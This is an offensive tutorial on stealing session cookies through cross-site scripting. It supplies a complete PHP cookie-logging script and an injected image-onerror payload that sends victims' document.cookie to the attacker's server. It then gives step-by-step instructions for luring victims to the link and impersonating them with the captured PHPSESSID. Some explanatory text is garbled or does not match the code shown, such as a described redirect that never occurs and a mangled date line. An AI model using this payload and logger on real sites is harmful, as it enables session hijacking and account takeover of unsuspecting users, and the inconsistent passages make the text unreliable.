# XSS - Cookie Stealing

You want to make it do something useful, like steal cookies. Cookie stealing is when you insert a script into the page so that everyone that views the modified page inadvertently sends you their cookie. By modifying your  cookie, you can impersonate any user who viewed the modified page. So how do you use XSS to steal cookies?

The easiest way is to use a three-step process consisting of the injected script, the cookie recorder, and the log file.

First you’ll need to get an account on a server and create two files, log.txt and index.php. You can leave log.txt empty. This is the file your cookie stealer will write to. Now paste this php code into your cookie stealer script (index.php):

Code:

Quote:

    <?php
    function GetIP()
    {
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
    $ip = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
    $ip = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
    $ip = getenv("REMOTE_ADDR");
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
    $ip = $_SERVER['REMOTE_ADDR'];
    else
    $ip = "unknown";
    return($ip);
    }
    function logData()
    {
    $ipLog="log.txt";
    $cookie = $_SERVER['QUERY_STRING'];
    $register_globals = (bool) ini_get('register_gobals');
    if ($register_globals) $ip = getenv('REMOTE_ADDR');
    else $ip = GetIP(); 
    $rem_port = $_SERVER['REMOTE_PORT'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $rqst_method = $_SERVER['METHOD'];
    $rem_host = $_SERVER['REMOTE_HOST'];
    $referer = $_SERVER['HTTP_REFERER'];
    $date=date ("l dS of F Y h:i:s A");
    $log=fopen("$ipLog", "a+");
    if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie <br>");
    else
    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
    fclose($log);
    }
    logData();
    ?>

This script will record the cookies of every user that views it.

## Next Step!

Now we need to get the vulnerable page to access this script. We can do that by modifying our earlier injection:

Code:

Quote:

    Ba1man”><img src=x onerror="this.src='http://my_ip_address/index.php?'+document.cookie; this.removeAttribute('onerror');">

_yoursite.com_  is the server you’re hosting your cookie stealer and log file on, and  _index.com_  is the vulnerable page you’re exploiting. The above code redirects the viewer to your script, which records their cookie to your log file. It then redirects the viewer back to the unmodified search page so they don’t know anything happened. Note that this injection will only work properly if you aren’t actually modifying the page source on the server’s end. Otherwise the unmodified page will actually be the modified page and you’ll end up in an endless loop. While this is a working solution, we could eliminate this potential issue when using source-modifying injections by having the user click a link that redirects them to our stealer:

Code:

Quote:

    logData();
    ?>

to this:

Code:

    logData();
    echo '<b>Page Under Construction</b>'
    ?>

Now when you open  _log.txt_, you should see something like this:

Code:

Quote:

    IP: ***.**.**.*** | PORT: 56840 | HOST: | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/2009032711 Ubuntu/8.10 (intrepid) Firefox/3.0.8 | METHOD: | REF: http://yoursite.com/index.php |
    DATE: Tuesday 21st 2022f March 2022 05:04:07 PM | COOKIE: cookie=PHPSESSID=889c6594db2541db1666cefca7537373


You will most likely see many other fields besides  PHPSESSID, but this one is good enough for this example. Open up firebug and add/modify all your cookie’s fields to match the data from the cookie in your log file and refresh the page. The server thinks you’re the user you stole the cookie from. This way you can log into accounts and many other things without even needing to know the passwords or usernames.

## Winding Up Altogether!

1. Test the page to make sure it’s vulnerable to XSS injections.
2. Once you know it’s vulnerable, upload the cookie stealer php file and log file to your server.
3. Insert the injection into the page via the url or text box.
4. Grab the link of that page with your exploited search query (if injection is not stored on the server’s copy of the page).
5. Get someone to use that link if necessary.
6. Check your log file for their cookie.
7. Modify your own cookie to match the captured one and refresh the page

Linux:

    ┌──(root💀kali)-[~/Desktop]
    └─# service apache2 stop
    ┌──(root💀kali)-[~/Desktop]
    └─# php -S my_ip_address:80

